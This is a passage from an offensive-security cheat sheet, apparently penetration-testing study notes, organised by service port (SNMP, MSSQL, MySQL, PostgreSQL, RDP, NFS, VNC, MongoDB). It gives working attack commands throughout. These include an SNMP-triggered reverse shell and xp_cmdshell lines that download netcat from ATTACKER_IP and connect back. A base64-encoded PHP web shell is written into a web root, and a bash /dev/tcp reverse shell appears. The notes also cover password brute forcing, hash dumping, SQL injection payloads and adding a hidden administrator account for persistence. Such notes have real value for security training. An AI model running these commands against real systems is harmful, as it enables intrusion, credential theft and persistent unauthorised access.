- **Find SIDs by name**: `lookupnames <username>`
- **Find more SIDs**: `lsaenumsid`
- **RID cycling (check more SIDs)**: `lookupsids <sid>`


## SNMP(s) - 161,162,10161,10162

Simple Network Management Protocol (SNMP), runs on UDP 161 and 162 (trap). The secure version (using TLS) is on 10161 and 10162.

Before getting started, install the MIBs:

```sh
sudo apt install -y snmp snmp-mibs-downloader
sudo download-mibs
```

For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)

Basic SNMP enumeration:

```sh
# nmap snmp scan
nmap --script "snmp* and not snmp-brute" $VICTIM_IP

# quick bruteforce snmp community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100

# extended bruteforce snmp community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp

# comprehensive enumeration (system/network/process/software info)
snmp-check $VICTIM_IP

snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.4.1.77.1.2.25 # users
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.6.13.1.3 # ports
snmpwalk -c public -v2c $VICTIM_IP 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -c public -v2c $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName # software
snmpwalk -c public -v2c 192.168.210.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull #additional details 


```


Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from SNMP:

- Email addresses
- SNMP community strings
- Password hashes
- Clear text passwords

### 2.13.1 Exploring MIBs with `snmptranslate`

From the [`snmptranslate` Tutorial](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):

```sh
# look up numeric OID to get abbreviated name
snmptranslate .1.3.6.1.2.1.1.3.0
snmptranslate -m +ALL .1.3.6.1.2.1.1.3.0

# look up OID node name without fully-qualified path (random access)
snmptranslate -IR sysUpTime.0

# convert abbreviated OID to numeric (dotted-decimal)
snmptranslate -On SNMPv2-MIB::sysDescr.0

# convert abbreviated OID to dotted-text
snmptranslate -Of SNMPv2-MIB::sysDescr.0
# convert numeric (dotted-decimal) to dotted-text
snmptranslate -m +ALL -Of .1.3.6.1.2.1.1.1.0

# get description/extended info about OID node
snmptranslate -Td SNMPv2-MIB::sysDescr.0
# same for numeric
snmptranslate -m +ALL -Td .1.3.6.1.2.1.1.1.0

# get tree view of subset of MIB tree
snmptranslate -Tp -IR system

# look up OID by regex (best match)
snmptranslate -Ib 'sys.*ime'

#  To get a list of all the nodes that match a given pattern, use the -TB flag:
snmptranslate -TB 'vacm.*table'

# find out what directories are searched for MIBS:
net-snmp-config --default-mibdirs # only if installed
snmptranslate -Dinit_mib .1.3 |& grep MIBDIR
```

When using the `-m +ALL` argument, I got the error:

```
Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
```

There is a typo in the file that gets pulled by `snmp-mibs-downloader`. The fix is to replace the existing file with a corrected version, which is located [here](http://pastebin.com/raw/p3QyuXzZ).

### 2.13.2 RCE with SNMP

See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)

Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)

```sh
# manually create reverse shell (update listener IP)
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/env 'nsExtendArgs."derp"' = 'python -c "import sys,socket,os,pty;os.fork() and sys.exit();os.setsid();os.fork() and sys.exit();s=socket.create_connection((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")"'

# trigger reverse shell by reading the OID
snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# delete the reverse shell command from the SNMP table
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = destroy
```

This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)

## LDAP 389, 636, 3268

```shell 
#we have a valuble bookmark/hutch

#enumerate info without authentication look for users/passwords
ldapsearch -x -H ldap://192.168.242.122 -b "dc=hutch,dc=offsec" > ldap.txt

cat ldap.txt | grep -i "samaccountname"
cat ldap.txt | grep -i "description"


```
## MSSQL - 1443

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It supports storing and retrieving data across a network (including the Internet).

```sh
# check for known vulns
searchsploit "microsoft sql server"

# if you know nothing about it, try 'sa' user w/o password:
nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER" -sV -p 1433 -oA nmap/safe-ms-sql $VICTIM_IP
# if you don't have creds, you can try to guess them, but be careful not to block
# accounts with too many bad guesses
```

**Post-Exploit PrivEsc**

The user running MSSQL server will have the privilege token **SeImpersonatePrivilege** enabled. You will probably be able to escalate to Administrator using this and [JuicyPotato](https://github.com/ohpe/juicy-potato)

### 2.15.1 MSSQL Credential Bruteforcing

```sh
# Be carefull with the number of password in the list, this could lock-out accounts
# Use the NetBIOS name of the machine as domain, if needed
crackmapexec mssql -d DOMAINNAME -u usernames.txt -p passwords.txt $VICTIM_IP
hydra -V -f -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
```

### 2.15.2 MSSQL Interaction

**Connecting to the MSSQL server**

From kali, for interactive session:

```sh
# simplest tool for interactive MSSQL session
impacket-mssqlclient USERNAME:PASSWORD@VICTIM_IP -windows-auth
# requires double quotes for xp_cmdshell strings

# alternative option, can use single quotes for xp_cmdshell strings
sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
```

From Windows:

```bat
sqlcmd -S SERVER -l 30
sqlcmd -S SERVER -U USERNAME -P PASSWORD -l 30
```

**Useful commands:**

```sql
-- show username
select user_name();
select current_user;  -- alternate way

-- show server version
select @@version;

-- get server name
select @@servername;

-- show list of databases ("master." is optional)
select name from master.sys.databases;
exec sp_databases;  -- alternate way
-- note: built-in databases are master, tempdb, model, and msdb
-- you can exclude them to show only user-created databases like so:
select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');

-- use database
use master

-- getting table names from a specific database:
select table_name from somedatabase.information_schema.tables;

-- getting column names from a specific table:
select column_name from somedatabase.information_schema.columns where table_name='sometable';

-- get credentials for 'sa' login user:
select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;

-- get credentials from offsec database (using 'dbo' table schema) user table
select * from offsec.dbo.users;

-- error/boolean-based blind injection
' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #

-- time-based blind injection
' WAITFOR DELAY '0:0:3'; -- #
```

### 2.15.3 MSSQL Command Execution

Simple command execution:

```bash
# Username + Password + CMD command
crackmapexec mssql -d DOMAIN -u USERNAME -p PASSWORD -x "whoami" $VICTIM_IP
# Username + Hash + PS command
crackmapexec mssql -d DOMAIN -u USERNAME -H HASH -X '$PSVersionTable' $VICTIM_IP
```

Using interactive session:

```sql
-- Check if you have server admin rights to enable command execution:
-- Returns 1 if admin
select is_srvrolemember('sysadmin');
go

-- Check if already enabled
-- check if xp_cmdshell is enabled
select convert(int, isnull(value, value_in_use)) as cmdshell_enabled from sys.configurations where name = n'xp_cmdshell';
go

-- turn on advanced options; needed to configure xp_cmdshell
exec sp_configure 'show advanced options', 1;reconfigure;
go

-- enable xp_cmdshell
exec sp_configure 'xp_cmdshell', 1;RECONFIGURE;
go

-- Quickly check what the service account is via xp_cmdshell
EXEC xp_cmdshell 'whoami';
go
-- can be shortened to just: xp_cmdshell 'whoami.exe';
-- long form: EXEC master..xp_cmdshell 'dir *.exe'

-- Bypass blackisted "EXEC xp_cmdshell"
DECLARE @x AS VARCHAR(50)='xp_cmdshell'; EXEC @x 'whoami' —

-- Get netcat reverse shell
xp_cmdshell 'powershell iwr -uri http://ATTACKER_IP/nc.exe -out c:\users\public\nc.exe'
go
xp_cmdshell 'c:\users\public\nc.exe -e cmd ATTACKER_IP 443'
go
```

## NFS - 2049

[HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)

```sh
# scan with scripts
nmap -n -v -p 2049 -sV --script="safe and nfs-*" -oA nfs-scripts $VICTIM_IP

# list all mountpoints
showmount -a $VICTIM_IP
# list all directories
showmount -d $VICTIM_IP
# list all exports (remote folders you can mount)
showmount -e $VICTIM_IP

# the exports are also in /etc/exports
# look for exports with no_root_squash/no_all_squash setting for privesc
# https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

# Mounting an exported share:
# mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# use version 2 because it doesn't have any authentication or authorization
# if mount fails, try without vers=2
# dir may need "/"prefix
# dir is one of showmount -e results (from /etc/exports)
mkdir nfs && \
sudo mount -t nfs -o rw,nolock,vers=2 $VICTIM_IP:DIR nfs

# create user with specific UID to be able to read files on your kali box
# "-s" login shell, "-M" no create home
sudo useradd -u 1014 -s /usr/sbin/nologin -M tempuser
# removing user when done:
sudo deluser --remove-home tempuser && sudo groupdel tempuser
# or just switch to root to read nearly everything:
sudo su
# if needing a specific group:
sudo groupadd -g 1010 tempgroup
sudo usermod -a -G tempgroup tempuser
```

## MySQL - 3306

Logging in:

```sh

## Remotely:
mysql -u root -h HOSTNAME

## Locally:
# as root without password (if allowed)
mysql -u root
# same, but prompt for password
mysql -u root -p
# provide password
mysql -u root -p'root'

```

Once logged in, check out the schema and environment:

```sql
-- show list of databases
show databases;
-- Set current database to mysql
use mysql;
-- show tables in current database
show tables;
-- describe the table schema for 'user' table
describe user;
select table_name,column_name,table_schema from information_schema.columns where table_schema=database();

-- show MySQL version (both versions work)
select version();
select @@version;
-- show logged-in user
select user();
select system_user();
-- show active database
select database();
show databases;
-- show system architecture
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
-- show plugin directory (for UDF exploit)
select @@plugin_dir;
show variables like 'plugin%';

-- Try to execute code (try all ways)
\! id
select sys_exec('id');
select do_system('id');

-- Try to read files
select load_file('/etc/passwd');
-- more complex method
create table if not exists test (entry TEXT);
load data local infile "/etc/passwd" into table test fields terminated by '\n';
select * from test;
-- show file privileges of 'test' user
select user,file_priv from mysql.user where user='test';
-- show all privs of current user
select * from mysql.user where user = substring_index(user(), '@', 1) ;

-- Look at passwords
-- MySQL 5.6 and below
select host, user, password from mysql.user;
-- MySQL 5.7 and above
select host, user, authentication_string from mysql.user;

-- add new user with full privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to test identified by 'test' WITH GRANT OPTION;
-- show exact privileges
use information_schema; select grantee, table_schema, privilege_type from schema_privileges;
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='OUTPUT OF select user()';
```

### ROOT MySQL cred UDF Exploit

```sh

https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf

You can use this guide https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/?source=post_page-----6cc4d6eea356--------------------------------
```


### 2.17.2 Grabbing MySQL Passwords

```sh
# contains plain-text password of the user debian-sys-maint
cat /etc/mysql/debian.cnf

# contains all the hashes of the MySQL users (same as what's in mysql.user table)
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

### 2.17.3 Useful MySQL Files

- Configuration Files:
  - Windows
    - config.ini
    - my.ini
    - windows\my.ini
    - winnt\my.ini
    - INSTALL_DIR/mysql/data/
  - Unix
    - my.cnf
    - /etc/my.cnf
    - /etc/mysql/my.cnf
    - /var/lib/mysql/my.cnf
    - ~/.my.cnf
- Command History:cd /
  - ~/.mysql.history
- Log Files:
  - connections.log
  - update.log
  - common.log


## RDP - 3389

**Bruteforce RDP Credentials:**

```sh
# brute force single user's password (watch out for account lockout! check password policy with MSRPC)
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://1

# password spray against list of users
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://VICTIM_IP

https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.2.182/32 -u admin -c Aa123456

```


**Add RDP User**: (good for persistence)

```powershell
net user pwned password123! /add
net localgroup Administrators pwned /add
net localgroup "Remote Desktop Users" pwned /add
# enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# delete user
net user derp /del
# disable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```


## PostgreSQL - 5432


**NOTE**: `psql` supports tab completion for table names, db names.

```postgresql
--bruteforce
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.206.56 postgres

-- connect or psql
psql -U postgres -p 5432 -h 192.168.

-- List databases
SELECT datname FROM pg_database;
\l
\list

-- List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

\c <database> -- use (connect to) the database
\d -- List tables
\d+ <tablename> -- describe table
-- SQL standard way to describe table:
select column_name, data_type from information_schema.columns where table_name = <tablename>

-- Get current user
Select user;
\du+ -- Get users roles

--Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

-- Get languages
SELECT lanname,lanacl FROM pg_language;

-- Show installed extensions
SHOW rds.extensions;

-- Get history of commands executed
\s

-- Check if current user is superuser 
-- (superuser always has file read/write/execute permissions)
-- 'on' if true, 'off' if false
SELECT current_setting('is_superuser');
```

**Reading text files:**

```postgresql
select string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')
```

**Writing 1-liner text files:**

```postgresql
-- base64 payload: '<?php system($_GET["cmd"]);?>'
copy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'
```

**Code Execution:**

```postgresql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
```

You can put any bash shell command in the string after PROGRAM (e.g. replace `'id'` with `'/bin/bash -c \"bash -i >& /dev/tcp/192.168.45.230/443 0>&1\"'`.


Postgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.

- String concat operator: `||`
- LIKE operator: `~~`
- Match regex (case sensitive): `~`
- [More operator documentation](https://www.postgresql.org/docs/6.3/c09.htm)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based) has great documentation on Postgres injection.


Interesting Groups/Roles:

- **`pg_execute_server_program`** can **execute** programs
- **`pg_read_server_files`** can **read** files
- **`pg_write_server_files`** can **write** files



## VNC - 5900,5800

VNC is a graphical remote desktop sharing system running on TCP port 5900, with a web interface on port 5800.

```sh
# nmap scan
nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP

# connect ('-passwd passwd.txt' to use password file)
vncviewer $VICTIM_IP

# bruteforcing
hydra -V -f -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
```



## MongoDB - 27017

MongoDB is a common open-source NoSQL database. It's service runs on 27017 by
default.

Compared to SQL databases:
- Instead of tables, it has *collections*
- Instead of rows, it has *documents*
- Instead of columns, it has *fields*

Data is stored using [BSON](https://bsonspec.org/), which is a binary-serialized form of JSON.

```sql
# starting mongo app, connecting to database server
mongosh     # connect to localhost:27017, no creds
mongosh -u <user> -p <password>
mongosh hostname:port
mongosh --host <host> --port <port>

# show list of databases
show databases;
# connect to database named "admin"
use admin;
# list names of collections (tables) in connected database
db.getCollectionNames();
# create new collection (table) called "users"
db.createCollection("users")
# create new document (row) in users collection:
db.users.insert({id:"1", username: "derp", email: "derp@derp.com", password: "herpderp"})
# show all documents (rows) in the users collection:
db.users.find()
# get all documents matching search criteria
db.users.find({id: {$gt: 5}})
# get first matching user document
db.users.findOne({id: '1'})
# change fields in a users document
db.users.update({id:"1"}, {$set: {username: "bubba"}});
# delete a document (by id)
db.users.remove({'id':'1'})
# drop the users collection (delete everything)
db.users.drop()
```

[Operators](https://docs.mongodb.com/manual/reference/operator/query/) (for searches/matching):

- $eq
- $ne
- $gt
- $lt
- $and
- $or
- $where
- $exists
- $regex
